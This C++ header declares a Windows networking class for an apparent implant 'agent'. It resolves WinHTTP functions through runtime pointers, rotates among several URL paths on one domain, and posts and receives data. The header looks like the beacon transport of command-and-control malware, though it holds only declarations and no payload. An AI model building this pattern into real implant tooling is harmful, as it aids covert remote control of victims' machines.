#pragma once
#include <windows.h>
#include <winhttp.h>
#include "agent/core.h"

#define DECL( x ) decltype( x ) * x

#define TOTAL_PATHS 5
#define MAX_PATH_LEN 1024
class NetMgr {
private:
	PBYTE RecvBuf;
	SIZE_T recvLen;
	SIZE_T recvCap;
	BOOL EnsureRecv( SIZE_T needed );
	struct Apis {
		DECL( WinHttpOpen );
		DECL( WinHttpConnect );
		DECL( WinHttpReadData );
		DECL( WinHttpOpenRequest );
		DECL( WinHttpSendRequest );
		DECL( WinHttpCloseHandle );
		DECL( WinHttpReceiveResponse );
		DECL( WinHttpQueryDataAvailable );
	};
	HMODULE WinHttpDll;

	Apis apis;

	WCHAR Paths[TOTAL_PATHS][MAX_PATH_LEN];
	PWCHAR Domain;

public:
	static void* operator new(SIZE_T size) {
		void* ptr = kratos->apis.LocalAlloc(ALLOC_ARGS, size);
		if ( ! ptr ) { return NULL; }
		return ptr;
	}

	NetMgr();
	BOOL Post( PBYTE data, SIZE_T DataSize );
	PBYTE Data( );
	SIZE_T DataSize( );
	void Cleanup();
	BOOL SetHttpConfig(INT32 TotalDomains, PCHAR Domain, PCHAR* Paths);
};


extern NetMgr* net;